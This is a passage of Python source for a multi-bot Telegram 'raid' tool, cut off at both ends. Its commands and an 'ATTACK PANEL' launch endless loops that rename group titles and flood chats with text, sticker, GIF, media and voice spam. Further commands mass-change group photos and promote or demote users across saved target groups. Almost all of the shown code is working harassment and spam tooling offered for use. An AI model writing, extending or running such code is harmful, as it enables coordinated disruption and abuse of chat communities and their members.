callback_data=f"atk_{task_id}_RAHULspam")],        [InlineKeyboardButton(text="❤️‍🩹 Raid RSPM", callback_data=f"atk_{task_id}_rspm"),         InlineKeyboardButton(text="❤️‍🩹 Slide Spam", callback_data=f"atk_{task_id}_slidespam")],        [InlineKeyboardButton(text="✖ Close", callback_data=f"atk_{task_id}_close")]    ])        await message.reply(        f"⚔️ **{font('ATTACK PANEL')}**\n{font('Target text:')} `{exact_text}`\n{font('Click any button below to launch attack with this text:')}",        reply_markup=kb,        parse_mode=ParseMode.MARKDOWN    )@dp.callback_query(F.data.startswith("atk_"))async def attack_callback_handler(query: types.CallbackQuery, bot: Bot):    if query.from_user.id not in SUDO_USERS:        return await query.answer("SUDO access required.", show_alert=True)            data = query.data.split("_")    if len(data) < 3:        return await query.answer("Invalid data.", show_alert=True)            task_id = data[1]    action = data[2]        menu = active_menus.get(task_id)    if not menu or menu.get("cmd") != "attack_menu":        return await query.answer("Menu expired.", show_alert=True)            if action == "close":        try: await query.message.edit_text("Attack menu closed.")        except Exception: pass        return await query.answer()            text = menu["text"]    is_lord = menu["is_lord"]    target_chats = get_target_chats(query.message, is_lord)        await query.answer(f"🚀 Launching {action.upper()} with text: {text}")        if action == "snc":        for c_id in target_chats:            active_bots = []            for b in bots:                try:                    member = await b.get_chat_member(c_id, b.id)                    if member.status not in ['left', 'kicked', 'banned']:                        active_bots.append(b)                except Exception:                    pass            if active_bots:                tid = str(uuid.uuid4())                seq_nc_tasks[c_id] = tid                asyncio.create_task(seq_nc_worker(c_id, text, active_bots, tid))        await query.message.reply(font(f"🚀 SNC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "nc":        for c_id in target_chats:            if c_id not in group_tasks: group_tasks[c_id] = {}            for b in bots:                tid = str(uuid.uuid4())                group_tasks[c_id][b.id] = tid                asyncio.create_task(nc_loop_worker(b, c_id, text, tid))        await query.message.reply(font(f"🔄 NC Raid Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "emo":        for c_id in target_chats:            if c_id not in group_tasks: group_tasks[c_id] = {}            for b in bots:                tid = str(uuid.uuid4())                group_tasks[c_id][b.id] = tid                asyncio.create_task(emo_loop_worker(b, c_id, text, tid))        await query.message.reply(font(f"🔄 Emoji NC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "kengnc":        for c_id in target_chats:            if c_id not in keng_tasks: keng_tasks[c_id] = {}            for b in bots:                tid = str(uuid.uuid4())                keng_tasks[c_id][b.id] = tid                asyncio.create_task(keng_loop_worker(b, c_id, text, tid))        await query.message.reply(font(f"🔺 KENG NC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "RAHULnc":        for c_id in target_chats:            if c_id not in RAHULnc_tasks: RAHULnc_tasks[c_id] = {}            for b in bots:                tid = str(uuid.uuid4())                RAHULnc_tasks[c_id][b.id] = tid                asyncio.create_task(RAHULnc_loop_worker(b, c_id, text, tid))        await query.message.reply(font(f"🔺 RAHUL NC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "spmnc":        for c_id in target_chats:            if c_id not in spmnc_tasks: spmnc_tasks[c_id] = {}            for b in bots:                tid = str(uuid.uuid4())                spmnc_tasks[c_id][b.id] = tid                asyncio.create_task(spmnc_worker(b, c_id, text, tid))        await query.message.reply(font(f"⚡ SPMNC Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "spm":        for c_id in target_chats:            if c_id not in spm_loop_tasks: spm_loop_tasks[c_id] = []            for i, b in enumerate(bots):                tid = str(uuid.uuid4())                spm_loop_tasks[c_id].append(tid)                asyncio.create_task(delayed_task(i * 0.15, spm_sender(b, c_id, None, text, spm_loop_tasks, c_id, tid)))        await query.message.reply(font(f"✅ Text SPM Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "RAHULspam":        for c_id in target_chats:            if c_id not in RAHULspam_tasks: RAHULspam_tasks[c_id] = []            for i, b in enumerate(bots):                tid = str(uuid.uuid4())                RAHULspam_tasks[c_id].append(tid)                asyncio.create_task(delayed_task(i * 0.15, RAHULspam_sender(b, c_id, text, RAHULspam_tasks, tid)))        await query.message.reply(font(f"🔥 RAHUL Spam Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "rspm":        for c_id in target_chats:            if c_id not in rspm_tasks: rspm_tasks[c_id] = []            for i, b in enumerate(bots):                tid = str(uuid.uuid4())                rspm_tasks[c_id].append(tid)                asyncio.create_task(delayed_task(i * 0.15, rspm_sender(b, c_id, text, rspm_tasks, tid)))        await query.message.reply(font(f"🔥 RSPM Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)            elif action == "slidespam":        for c_id in target_chats:            if c_id not in spm_loop_tasks: spm_loop_tasks[c_id] = []            for i, b in enumerate(bots):                tid = str(uuid.uuid4())                spm_loop_tasks[c_id].append(tid)                asyncio.create_task(delayed_task(i * 0.15, spm_sender(b, c_id, None, text, spm_loop_tasks, c_id, tid)))        await query.message.reply(font(f"💥 Slide/Text SPM Attack started with text: `{text}`"), parse_mode=ParseMode.MARKDOWN)# ==================== help MENU COMMAND ====================def build_help_main_keyboard():    return InlineKeyboardMarkup(inline_keyboard=[        [InlineKeyboardButton(text=f"🤍 {font('NC SECTION')}", callback_data="help_cat_nc")],        [InlineKeyboardButton(text=f"❤️‍🩹 {font('SPAM & SLIDE')}", callback_data="help_cat_spam")],        [InlineKeyboardButton(text=f"📸 {font('MEDIA & STICKER')}", callback_data="help_cat_media")],        [InlineKeyboardButton(text=f"🥱 {font('REPLY & REACT')}", callback_data="help_cat_reply")],        [InlineKeyboardButton(text=f"🤫 {font('ADMIN & SYSTEM')}", callback_data="help_cat_admin")],        [InlineKeyboardButton(text=f"✖ {font('CLOSE')}", callback_data="help_close")]    ])@dp.message(Command("help", prefix="-./X!"))async def cmd_help(message: types.Message, bot: Bot):    if not is_sudo(get_auth_id(message)):        return    await safe_reply(        message,         f"🎛 **{font('COMMAND MENU')}**\n{font('Select a category below to view all commands in text format:')}",         reply_markup=build_help_main_keyboard(),        parse_mode=ParseMode.MARKDOWN    )@dp.callback_query(F.data.startswith("help_"))async def help_menu_callback(query: types.CallbackQuery):    if not is_sudo(query.from_user.id):        return await query.answer("SUDO access required.", show_alert=True)        action = query.data.removeprefix("help_")        if action == "close":        try: await query.message.edit_text("Menu closed.")        except Exception: pass        return await query.answer()    if action == "main":        await query.message.edit_text(            f"🎛 **{font('COMMAND MENU')}**\n{font('Select a category below to view all commands in text format:')}",            reply_markup=build_help_main_keyboard(),            parse_mode=ParseMode.MARKDOWN        )        return await query.answer()    back_kb = InlineKeyboardMarkup(inline_keyboard=[        [InlineKeyboardButton(text="🔙 Back", callback_data="help_main"), InlineKeyboardButton(text="✖ Close", callback_data="help_close")]    ])    if action == "cat_nc":        text = f"""🤍 **{font("NAME CHANGE (NC) COMMANDS")}**• `!snc <text>` ➜ {font("Start sequential multi-bot title change")}• `!dsnc` ➜ {font("Stop sequential NC")}• `!nc <name>` ➜ {font("Start raid title change loop")}• `!dnc` ➜ {font("Stop raid title change")}• `!emo <text>` ➜ {font("Emoji title change loop")}• `!demo` ➜ {font("Stop emoji NC")}• `!kengnc <name>` ➜ {font("KENG template title change")}• `!dkengnc` ➜ {font("Stop KENG NC")}• `!RAHULnc <name>` ➜ {font("RAHUL pattern title change")}• `!dRAHULnc` ➜ {font("Stop RAHUL NC")}• `!spmnc <text>` ➜ {font("Dual action title + text spam")}• `!dspmnc` ➜ {font("Stop SPMNC loop")}• `!delaync <ms>` ➜ {font("Set title change delay")}"""        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)        return await query.answer()    elif action == "cat_spam":        text = f"""❤️‍🩹 **{font("SPAM & SLIDE COMMANDS")}**• `!spm <text>` ➜ {font("High speed text spam loop")}• `!dspm` ➜ {font("Stop SPM loops")}• `!RAHULspam <text>` ➜ {font("Max length text wrapping spam")}• `!dRAHULspam` ➜ {font("Stop RAHUL SPAM")}• `!rspm <name>` ➜ {font("Raid text chunk spam")}• `!drspm` ➜ {font("Stop RSPM")}• `!slidespam <text>` ➜ {font("Lock slide spam on target message")}• `!dslidespam` ➜ {font("Stop SlideSpam")}• `!forwardspm` ➜ {font("Forward message continuously")}• `!dforwardspm` ➜ {font("Stop Forward SPM")}• `!dallspm` / `!gdall` ➜ {font("Kill all spam tasks globally")}"""        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)        return await query.answer()    elif action == "cat_media":        text = f"""📸 **{font("MEDIA & STICKER COMMANDS")}**• `!makesticker <text>` ➜ {font("Open Sticker Studio generator")}• `!tts <text>` ➜ {font("Synthesize spoken audio note")}• `!stickerspm` / `!dstickerspm`• `!gifspm` / `!dgifspm`• `!mediaspm` / `!dmediaspm`• `!voicespm` / `!dvoicespm`• `!pfp` / `!dpfp` / `!gpfp`• `!save` / `!del` / `!gsave`• `!delallmedia`"""        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)        return await query.answer()    elif action == "cat_reply":        text = f"""🥱 **{font("REPLY & REACT COMMANDS")}**• `!replyRAHUL` / `!dreplyRAHUL`• `!react <emoji>` / `!dreact`• `!swipe <name>` / `!dswipe`• `!targetslide <name>` / `!dtargetslide`"""        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)        return await query.answer()    elif action == "cat_admin":        text = f"""🤫 **{font("ADMIN & SYSTEM COMMANDS")}**• `!setmenupic` / `!resetmenupic` ➜ {font("Manage global start menu picture")}• `!addgroup` / `!delgroup` / `!listgroup`• `!gpromote` / `!gdemote`• `!mute` / `!unmute` / `!mutelist`• `!addsudo` / `!delsudo` / `!listsudo`• `!nuke` / `!startpfp` / `!activebots`• `!broadcast <text>` / `!status` / `!ping` / `!on`• `!o` / `!leave` / `!dall`"""        await query.message.edit_text(text, reply_markup=back_kb, parse_mode=ParseMode.MARKDOWN)        return await query.answer()    await query.answer()@dp.message(Command("addgroup", prefix="-./X!"))async def cmd_addgroup(message: types.Message, bot: Bot):    if not is_sudo(get_auth_id(message)):        return    if message.chat.type not in ("group", "supergroup"):        return await safe_reply(message, font("Use !addgroup inside the group you want to save."))    lord_groups.add(message.chat.id)    save_db()    await safe_reply(message, font(f"✅ Added this group to Lord list. Total: {len(lord_groups)}"))@dp.message(Command("delgroup", prefix="-./X!"))async def cmd_delgroup(message: types.Message, bot: Bot):    if not is_sudo(get_auth_id(message)):        return    if message.chat.id not in lord_groups:        return await safe_reply(message, font("This group is not in the Lord list."))    lord_groups.discard(message.chat.id)    save_db()    await safe_reply(message, font(f"✅ Removed this group from Lord list. Total: {len(lord_groups)}"))@dp.message(Command("listgroup", prefix="-./X!"))async def cmd_listgroup(message: types.Message, bot: Bot):    if not is_sudo(get_auth_id(message)):        return    if not lord_groups:        return await safe_reply(message, font("Lord list is empty. Use !addgroup inside a group to add it."))    lines = [font("👑 Lord groups:")]    for chat_id in sorted(lord_groups):        lines.append(f"• {chat_id}")    await safe_reply(message, "\n".join(lines))@dp.message(Command("gpromote", prefix="-./X!"))async def cmd_gpromote(message: types.Message, bot: Bot):    if not is_sudo(get_auth_id(message)):        return    target_message = message.reply_to_message    if not target_message or not target_message.from_user:        return await safe_reply(message, font("Reply to the target user's message with !gpromote."))        target_uid = target_message.from_user.id    target_name = target_message.from_user.first_name        if not lord_groups:        return await safe_reply(message, font("⚠️ Lord list is empty! Use !addgroup in groups first."))            promoted_count = 0    for chat_id in list(lord_groups):        for b in bots:            try:                await set_admin(b, chat_id, target_uid, True)                promoted_count += 1                break            except Exception:                pass                    await safe_reply(message, font(f"👑 Promoted {target_name} across {promoted_count}/{len(lord_groups)} Lord list groups!"))@dp.message(Command("gdemote", prefix="-./X!"))async def cmd_gdemote(message: types.Message, bot: Bot):    if not is_sudo(get_auth_id(message)):        return    target_message = message.reply_to_message    if not target_message or not target_message.from_user:        return await safe_reply(message, font("Reply to the target user's message with !gdemote."))        target_uid = target_message.from_user.id    target_name = target_message.from_user.first_name        if not lord_groups:        return await safe_reply(message, font("⚠️ Lord list is empty! Use !addgroup in groups first."))            demoted_count = 0    for chat_id in list(lord_groups):        for b in bots:            try:                await set_admin(b, chat_id, target_uid, False)                demoted_count += 1                break            except Exception:                pass                    await safe_reply(message, font(f"🛑 Demoted {target_name} across {demoted_count}/{len(lord_groups)} Lord list groups!"))@dp.message(Command("nuke", prefix="-./X!"))async def cmd_nuke(message: types.Message, bot: Bot):    if not is_sudo(get_auth_id(message)):        return    chat_id = message.chat.id    task_dicts = (        group_tasks, seq_nc_tasks, keng_tasks, spmnc_tasks, RAHULnc_tasks,        slidespam_tasks, spm_loop_tasks, rspm_tasks, RAHULspam_tasks,        forwardspm_tasks, sticker_spm_tasks, gif_spm_tasks, media_spm_tasks,        voice_spm_tasks, pfp_tasks,    )    stopped = 0    for task_dict in task_dicts:        if chat_id in task_dict:            val = task_dict.pop(chat_id, None)            if isinstance(val, (dict, list, set)):                val.clear()            stopped += 1    swipe_mode.pop(chat_id, None)    await safe_reply(message, font(f"🛑 Stopped tracked task state for this chat ({stopped} task groups)."))@dp.channel_post(Command("on", prefix="-./X!"))@dp.message(Command("on", prefix="-./X!"))async def cmd_on(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    await safe_reply(message, font("🟢 BOT IS ONLINE AND READY"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("uptime", prefix="-./X!"))@dp.message(Command("uptime", prefix="-./X!"))async def cmd_uptime(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    await safe_reply(message, font(f"⏱️ **UPTIME:** {get_uptime()}"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("status", prefix="-./X!"))@dp.message(Command("status", prefix="-./X!"))async def cmd_status(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    active = get_active_groups_info()    txt = font(f"📊 **BOT STATUS**\n\n⏱️ **Uptime:** {get_uptime()}\n🌐 **Online Bots:** {len(bots)}\n🔥 **Active Groups/Channels ({len(active)}):**\n")    for id in active:        txt += f"• `{id}`\n"    await safe_reply(message, txt, parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dall", "gdall", prefix="-./X!"))@dp.message(Command("dall", "gdall", prefix="-./X!"))async def cmd_stop_all(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_owner(get_auth_id(message)): return await safe_reply(message, font("❌ Only OWNER can do this."))        group_tasks.clear()    seq_nc_tasks.clear()    keng_tasks.clear()    spmnc_tasks.clear()    RAHULnc_tasks.clear()    slidespam_tasks.clear()    targetslide_targets.clear()    spm_loop_tasks.clear()    RAHULspam_tasks.clear()    rspm_tasks.clear()    forwardspm_tasks.clear()    sticker_spm_tasks.clear()    gif_spm_tasks.clear()    media_spm_tasks.clear()    voice_spm_tasks.clear()    pfp_tasks.clear()    swipe_mode.clear()    reply_RAHUL_targets.clear()    react_targets.clear()        save_db()    await safe_reply(message, font("🛑 All operations have been terminated globally."))@dp.channel_post(Command("snc", "gsnc", "lordsnc", prefix="-./X!"))@dp.message(Command("snc", "gsnc", "lordsnc", prefix="-./X!"))async def cmd_snc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        exact_text = get_exact_text(message)    if not exact_text:         return await safe_reply(message, font("⚠️ Usage: !snc <text> or !gsnc <text>"))        is_lord = command.command.startswith("g") or command.command.startswith("lord")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        active_bots = []        for b in bots:            try:                member = await b.get_chat_member(c_id, b.id)                if member.status not in ['left', 'kicked', 'banned']:                    active_bots.append(b)            except Exception:                pass                        if active_bots:            task_id = str(uuid.uuid4())            seq_nc_tasks[c_id] = task_id            asyncio.create_task(seq_nc_worker(c_id, exact_text, active_bots, task_id))    scope_str = f"across {len(target_chats)} Lord list groups!" if is_lord else "in this chat!"    await safe_reply(message, font(f"🚀 Sequential Multi-Bot NC started {scope_str}"))@dp.channel_post(Command("dsnc", "gdsnc", prefix="-./X!"))@dp.message(Command("dsnc", "gdsnc", prefix="-./X!"))async def cmd_dsnc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(seq_nc_tasks, c_id)    await safe_reply(message, font("🛑 Sequential NC stopped."))@dp.channel_post(Command("nc", "gnc", "lordnc", prefix="-./X!"))@dp.message(Command("nc", "gnc", "lordnc", prefix="-./X!"))async def cmd_nc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!nc <name>` or `!gnc <name>`", parse_mode=ParseMode.MARKDOWN)        is_lord = command.command.startswith("g") or command.command.startswith("lord")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        if c_id not in group_tasks: group_tasks[c_id] = {}        for b in bots:            task_id = str(uuid.uuid4())            group_tasks[c_id][b.id] = task_id            asyncio.create_task(nc_loop_worker(b, c_id, command.args.strip(), task_id))                scope_str = f"across {len(target_chats)} Lord list groups!" if is_lord else "in this chat!"    await safe_reply(message, font(f"🔄 Raid Text NC loop started for `{command.args.strip()}` {scope_str}"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dnc", "gdnc", prefix="-./X!"))@dp.message(Command("dnc", "gdnc", prefix="-./X!"))async def cmd_stop_nc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return        is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(group_tasks, c_id)    await safe_reply(message, font("🛑 Raid Text NC loop stopped."))@dp.channel_post(Command("emo", "gemo", prefix="-./X!"))@dp.message(Command("emo", "gemo", prefix="-./X!"))async def cmd_emo(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!emo <text>` or `!gemo <text>`", parse_mode=ParseMode.MARKDOWN)        is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        if c_id not in group_tasks: group_tasks[c_id] = {}        for b in bots:            task_id = str(uuid.uuid4())            group_tasks[c_id][b.id] = task_id            asyncio.create_task(emo_loop_worker(b, c_id, command.args.strip(), task_id))    await safe_reply(message, font("🔄 Emoji NC loop started!"))@dp.channel_post(Command("demo", "gdemo", prefix="-./X!"))@dp.message(Command("demo", "gdemo", prefix="-./X!"))async def cmd_stop_emo(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(group_tasks, c_id)    await safe_reply(message, font("🛑 Emoji NC loop stopped."))@dp.channel_post(Command("kengnc", "gkengnc", prefix="-./X!"))@dp.message(Command("kengnc", "gkengnc", prefix="-./X!"))async def cmd_kengnc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!kengnc <name>`", parse_mode=ParseMode.MARKDOWN)        is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        if c_id not in keng_tasks: keng_tasks[c_id] = {}        for b in bots:            task_id = str(uuid.uuid4())            keng_tasks[c_id][b.id] = task_id            asyncio.create_task(keng_loop_worker(b, c_id, command.args.strip(), task_id))    await safe_reply(message, font(f"🔺 KENG Name Change loop started for `{command.args.strip()}`!"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dkengnc", "gdkengnc", prefix="-./X!"))@dp.message(Command("dkengnc", "gdkengnc", prefix="-./X!"))async def cmd_stop_kengnc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(keng_tasks, c_id)    await safe_reply(message, font("🛑 KENG NC loop stopped."))@dp.channel_post(Command("RAHULnc", "gRAHULnc", prefix="-./X!"))@dp.message(Command("RAHULnc", "gRAHULnc", prefix="-./X!"))async def cmd_RAHULnc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!RAHULnc <name>`", parse_mode=ParseMode.MARKDOWN)        is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        if c_id not in RAHULnc_tasks: RAHULnc_tasks[c_id] = {}        for b in bots:            task_id = str(uuid.uuid4())            RAHULnc_tasks[c_id][b.id] = task_id            asyncio.create_task(RAHULnc_loop_worker(b, c_id, command.args.strip(), task_id))    await safe_reply(message, font(f"🔺 RAHUL NC loop started for `{command.args.strip()}`!"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dRAHULnc", "gdRAHULnc", prefix="-./X!"))@dp.message(Command("dRAHULnc", "gdRAHULnc", prefix="-./X!"))async def cmd_dRAHULnc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(RAHULnc_tasks, c_id)    await safe_reply(message, font("🛑 RAHUL NC loop stopped."))@dp.channel_post(Command("spmnc", "gspmnc", prefix="-./X!"))@dp.message(Command("spmnc", "gspmnc", prefix="-./X!"))async def cmd_spmnc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!spmnc <text>`", parse_mode=ParseMode.MARKDOWN)        is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)        for c_id in target_chats:        if c_id not in spmnc_tasks: spmnc_tasks[c_id] = {}        for b in bots:            task_id = str(uuid.uuid4())            spmnc_tasks[c_id][b.id] = task_id            asyncio.create_task(spmnc_worker(b, c_id, command.args.strip(), task_id))    await safe_reply(message, font(f"⚡ SPMNC dual-loop started for `{command.args.strip()}`!"), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("dspmnc", "gdspmnc", prefix="-./X!"))@dp.message(Command("dspmnc", "gdspmnc", prefix="-./X!"))async def cmd_stop_spmnc(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    is_lord = command.command.startswith("g")    target_chats = get_target_chats(message, is_lord)    for c_id in target_chats:        stop_task_group(spmnc_tasks, c_id)    await safe_reply(message, font("🛑 SPMNC loop stopped."))@dp.channel_post(Command("delaync", prefix="-./X!"))@dp.message(Command("delaync", prefix="-./X!"))async def cmd_delaync(message: types.Message, command: CommandObject, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    try:        if not command.args: raise ValueError        val = int(command.args)        nc_delays[message.chat.id] = max(10, val)        await safe_reply(message, font(f"✅ Name Change delay set to `{val}` ms for this group."), parse_mode=ParseMode.MARKDOWN)    except Exception:        await safe_reply(message, font("❌ Invalid number."))@dp.channel_post(Command("save", prefix="-./X!"))@dp.message(Command("save", prefix="-./X!"))async def cmd_save(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message or not message.reply_to_message.photo:        return await safe_reply(message, font("⚠️ Reply to a photo with `!save`"), parse_mode=ParseMode.MARKDOWN)    chat_id = message.chat.id    photo = message.reply_to_message.photo[-1]    folder = os.path.join(os.path.dirname(__file__), 'downloads', str(chat_id))    os.makedirs(folder, exist_ok=True)    await bot.download(photo, destination=os.path.join(folder, f"{photo.file_unique_id}.jpg"))    await safe_reply(message, font("📸 Photo saved locally for this group!"))@dp.channel_post(Command("del", prefix="-./X!"))@dp.message(Command("del", prefix="-./X!"))async def cmd_del(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message or not message.reply_to_message.photo:        return await safe_reply(message, font("⚠️ Reply to the saved photo with `!del`"), parse_mode=ParseMode.MARKDOWN)    uid = message.reply_to_message.photo[-1].file_unique_id    target = os.path.join(os.path.dirname(__file__), 'downloads', str(message.chat.id), f"{uid}.jpg")    if os.path.exists(target):        os.remove(target)        await safe_reply(message, font("🗑 Photo deleted from this group's storage!"))    else:        await safe_reply(message, font("⚠️ This photo is not in the storage."))@dp.channel_post(Command("gsave", prefix="-./X!"))@dp.message(Command("gsave", prefix="-./X!"))async def cmd_gsave(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message or not message.reply_to_message.photo:        return await safe_reply(message, font("⚠️ Reply to a photo with `!gsave`"), parse_mode=ParseMode.MARKDOWN)    photo = message.reply_to_message.photo[-1]    await bot.download(photo, destination=os.path.join(global_storage, f"{photo.file_unique_id}.jpg"))    await safe_reply(message, font("🌍 Photo saved to GLOBAL storage!"))@dp.channel_post(Command("delgpfp", prefix="-./X!"))@dp.message(Command("delgpfp", prefix="-./X!"))async def cmd_delgpfp(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message or not message.reply_to_message.photo:        return await safe_reply(message, font("⚠️ Reply to the saved photo with `!delgpfp`"), parse_mode=ParseMode.MARKDOWN)    uid = message.reply_to_message.photo[-1].file_unique_id    target = os.path.join(global_storage, f"{uid}.jpg")    if os.path.exists(target):        os.remove(target)        await safe_reply(message, font("🗑 Photo deleted from GLOBAL storage!"))    else:        await safe_reply(message, font("⚠️ This photo is not in the Global storage."))@dp.channel_post(Command("delallmedia", prefix="-./X!"))@dp.message(Command("delallmedia", prefix="-./X!"))async def cmd_delallmedia(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_owner(get_auth_id(message)): return await safe_reply(message, font("❌ Only OWNER can do this."))    dldir = os.path.join(os.path.dirname(__file__), 'downloads')    if os.path.exists(dldir):        shutil.rmtree(dldir)        os.makedirs(global_storage, exist_ok=True)        await safe_reply(message, font("💥 All saved media (global and groups) has been deleted!"))    else:        await safe_reply(message, font("⚠️ No media folder found."))@dp.channel_post(Command("gpfp", prefix="-./X!"))@dp.message(Command("gpfp", prefix="-./X!"))async def cmd_gpfp(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    files = [f for f in os.listdir(global_storage) if f.endswith('.jpg') and not f.startswith("start_pic")]    if not files: return await safe_reply(message, font("⚠️ No photos in GLOBAL storage. Use `!gsave` first."), parse_mode=ParseMode.MARKDOWN)        info_msg = await message.reply(font("🌍 Updating ALL known group and channel PFPs globally..."), parse_mode=ParseMode.MARKDOWN)    success = 0        for cid in list(known_chats):        if cid > 0: continue        pic = random.choice(files)                for b in bots:            try:                await b.set_chat_photo(cid, FSInputFile(os.path.join(global_storage, pic)))                success += 1                break            except Exception: pass                await bot.edit_message_text(font(f"✅ Global PFP update complete! Changed successfully in {success} groups/channels."), chat_id=message.chat.id, message_id=info_msg.message_id, parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("pfp", prefix="-./X!"))@dp.message(Command("pfp", prefix="-./X!"))async def cmd_pfp(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    folder = os.path.join(os.path.dirname(__file__), 'downloads', str(message.chat.id))    if not os.path.exists(folder) or not [f for f in os.listdir(folder) if f.endswith('.jpg')]:        return await safe_reply(message, font("⚠️ No photos saved for this group. Use `!save` first."), parse_mode=ParseMode.MARKDOWN)    task_id = str(uuid.uuid4())[:8]    active_menus[task_id] = {"cmd": "pfp", "chat_id": message.chat.id, "selected": set(range(len(bots)))}    await message.reply(font("📸 **PFP LOOP MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("stickerspm", prefix="-./X!"))@dp.message(Command("stickerspm", prefix="-./X!"))async def cmd_stickerspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not is_sudo(get_auth_id(message)): return    if not message.reply_to_message or not message.reply_to_message.sticker:        return await safe_reply(message, font("⚠️ Reply to a sticker with `!stickerspm`"), parse_mode=ParseMode.MARKDOWN)    task_id = str(uuid.uuid4())[:8]    active_menus[task_id] = {        "cmd": "stickerspm", "chat_id": message.chat.id,         "from_chat_id": message.reply_to_message.chat.id, "msg_id": message.reply_to_message.message_id,         "selected": set(range(len(bots)))    }    await message.reply(font("🎭 **STICKER SPAM MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)@dp.channel_post(Command("gifspm", prefix="-./X!"))@dp.message(Command("gifspm", prefix="-./X!"))async def cmd_gifspm(message: types.Message, bot: Bot):    if is_processed(message.message_id, message.chat.id): return    if not 